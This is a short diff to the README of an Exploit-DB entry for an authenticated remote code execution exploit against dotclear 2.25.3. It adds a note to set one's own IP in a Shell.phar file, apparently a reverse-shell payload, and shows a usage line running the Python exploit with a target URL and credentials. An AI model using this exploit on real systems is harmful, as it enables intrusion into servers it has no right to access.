@@ -1,6 +1,8 @@
 # EDB-ID-51353
 dotclear 2.25.3 - Remote Code Execution (RCE) (Authenticated)
 
+Change Your Ip in Shell.phar file 
+
 Usages:
 
 ```python3 EDB-ID-51353.py -d http://192.168.0.118 -u tikku -p 123456```
